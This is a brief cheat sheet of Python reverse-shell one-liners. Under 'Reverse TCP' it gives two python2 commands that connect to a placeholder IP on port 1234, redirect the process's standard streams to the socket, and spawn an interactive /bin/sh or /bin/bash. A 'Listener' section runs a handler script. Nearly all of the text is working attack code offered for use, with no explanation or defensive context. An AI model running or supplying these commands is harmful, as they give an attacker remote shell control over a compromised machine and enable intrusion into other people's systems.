# Python

## Reverse TCP

python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("xx.xx.xx.xx",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

python2 -c 'import pty,socket,os;s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(("xxx.xxx.xx.xx", 1234)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash");s.close()' 

## Listener

python2 tcp_pty_shell_handler.py -b 127.0.0.1:1234

